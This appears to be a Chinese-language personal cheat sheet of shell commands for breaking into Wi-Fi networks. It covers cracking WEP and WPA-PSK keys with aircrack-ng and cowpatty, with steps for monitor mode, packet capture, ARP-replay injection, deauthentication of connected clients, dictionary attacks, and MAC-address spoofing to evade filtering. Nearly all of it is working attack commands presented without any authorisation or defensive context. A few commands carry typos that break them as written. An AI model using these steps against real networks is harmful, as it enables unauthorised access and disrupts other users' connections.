

    ifconfig eth0 up
    
    对于已经存在DHCP的网络，可以用如下命令使得网卡能够自动获取地址
    dhclient eth0
    
##### 破解WEP加密

1. 载入无线网卡

    ifconfig

    ifconfig wlan0 up
    
2. 激活无线网卡至monitor，即监听器模式

    airmon-ng start wlan0
    
3. 探测无线网络，抓取无线数据包

    airodump-ng mon0
    
    airodump-ng --ivs -w ivsfile -c 6 wlan0
    
4. 对目标AP使用AirRequest注入攻击

    aireplay-ng -3 -b AP'sMAC -h Client'sMAC mon0
    
5. 打开aircrack-ng，开始破解WEP(other shell)

    aircrack-ng visfile*.ivs


##### 破解WPA-PSK加密

1. 升级Aircrack-ng(Onece)

    airodump-ng-oui-update
    
2. 载入无线网卡

    ifconfig wlan0 up
    
3. 激活无线网卡至monitor，即监听模式

    airmon-ng start wlan0
    
4. 探测无线网络，抓取无线数据包

    airodump-ng mon0        

    airodump-ng -c 6 -w capfile mon0
    
5. 进行Deauth攻击加速破解过程

    aireplay-ng -0 1 -a AP'sMAC -c Client'sMAC wlan0
    
6. 开始破解WPA-PSK

    aircrack-ng -w dic capfile*.cap
    
    使用Cowpatty破解WPA-PSK加密
    
    cowpatty -f dic -r capfile*.cap -s SSID
    
tips
    
    root@raspberrypi:/home/pi# airodump-ng mon0
    nl80211 not found.
    Interface mon0: 
    ioctl(SIOCGIFINDEX) failed: No such device

    modprobe cfg80211

##### linux下修改mac地址

    ifconfi eth1 hw ether <MAC>
    
    macchanger -m <MAC> wlan0
    
    macchanger --mac=<MAC> wlan